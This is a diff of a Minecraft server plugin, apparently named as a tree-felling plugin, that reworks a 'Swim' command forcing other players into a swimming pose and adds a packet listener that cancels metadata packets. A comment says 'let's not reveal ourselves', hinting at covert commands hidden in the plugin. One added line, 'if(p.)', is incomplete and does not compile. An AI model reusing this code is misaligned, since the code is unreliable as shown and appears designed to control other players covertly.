@@ -1,10 +1,12 @@
 package me.bow.treecapitatorultimate.commands.Player;
 
 import me.bow.treecapitatorultimate.Start;
+import me.bow.treecapitatorultimate.Utils.Packet.Packet;
+import me.bow.treecapitatorultimate.Utils.Packet.PacketEvent;
+import me.bow.treecapitatorultimate.Utils.Packet.PacketManager;
 import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
-import net.minecraft.server.v1_15_R1.EntityHuman;
 import net.minecraft.server.v1_15_R1.EntityPose;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
@@ -31,41 +33,12 @@ public class Swim extends Command {
         if (m == Material.WATER || m == Material.LAVA) return; //let's not reveal ourselves
         p.setSwimming(swim);
         try {
-            ReflectionUtils.getMethod(EntityHuman.class, "setPose", EntityPose.class).invoke(((CraftPlayer) p).getHandle(), EntityPose.SLEEPING);
+            ReflectionUtils.getMethod(ReflectionUtils.getClass("{nms}.EntityHuman"), "setPose", ReflectionUtils.getClass("{nms}.EntityPose")).invoke(((CraftPlayer) p).getHandle(), EntityPose.SWIMMING);
         } catch (IllegalAccessException e) {
             e.printStackTrace();
         } catch (InvocationTargetException e) {
             e.printStackTrace();
         }
-        if (!swim) return;
-                    /*for (Player d : Bukkit.getOnlinePlayers()) {
-                        DataWatcher data = ((CraftLivingEntity) d).getHandle().getDataWatcher();
-                        data.set(DataWatcherRegistry.a.a(0), getEntityMetadata(false, false, true, true, false, false, false)); // 0x2 for sneak, 0x8 for hide arm, 0x10 for swimming
-                        PacketPlayOutEntityMetadata packet = new PacketPlayOutEntityMetadata(p.getEntityId(), data, false);
-                        final Object nmsPlayer;
-                        final Field playerConnectionField;
-                        Object pConnection = null;
-                        Method sendPacket = null;
-                        Class packetClass = ReflectionUtils.getMinecraftClass("Packet");
-                        try {
-                            nmsPlayer = p.getClass().getMethod("getHandle").invoke(p);
-                            playerConnectionField = nmsPlayer.getClass().getField("playerConnection");
-                            pConnection = playerConnectionField.get(nmsPlayer);
-                            sendPacket = pConnection.getClass().getMethod("sendPacket", packetClass);
-                        } catch (Exception e) {
-                            e.printStackTrace();
-                        }
-
-                        try {
-                            for (Player p2 : Bukkit.getOnlinePlayers()) {
-                                if (sendPacket != null) {
-                                    sendPacket.invoke(pConnection, packet);
-                                }
-                            }
-                        } catch (Exception e) {
-                            e.printStackTrace();
-                        }
-                    }*/
     }
 
     @Override
@@ -88,11 +61,13 @@ public class Swim extends Command {
                 setSwim(p, true);
                 p.sendMessage(Start.Prefix + ChatColor.BLUE + anotherPlayer.getName() + ChatColor.GREEN + " is now swimming!");
                 players.add(anotherPlayer.getUniqueId());
+                PacketManager.instance.addListener(anotherPlayer, this);
                 return;
             }
             p.sendMessage(Start.Prefix + ChatColor.BLUE + anotherPlayer.getName() + ChatColor.RED + " is now longer swimming!");
             players.remove(anotherPlayer.getUniqueId());
             setSwim(p, false);
+            PacketManager.instance.removeListener(anotherPlayer, this);
         } catch (Exception e) {
             Start.ErrorException(p, e);
         }
@@ -107,6 +82,14 @@ public class Swim extends Command {
     public void onPlayerSwimToggle(EntityToggleSwimEvent e) {
         if (!players.contains(e.getEntity().getUniqueId())) return;
         if (e.isSwimming()) return;
+        e.setCancelled(true);
+    }
+
+    @Override
+    public void onPacketSend(PacketEvent e) {
+        Packet p = e.getPacket();
+        if(!p.getPacketClass().getSimpleName().equalsIgnoreCase("PacketPlayOutEntityMetadata")) return;
+        if(p.)
         e.setCancelled(true);
     }
 }
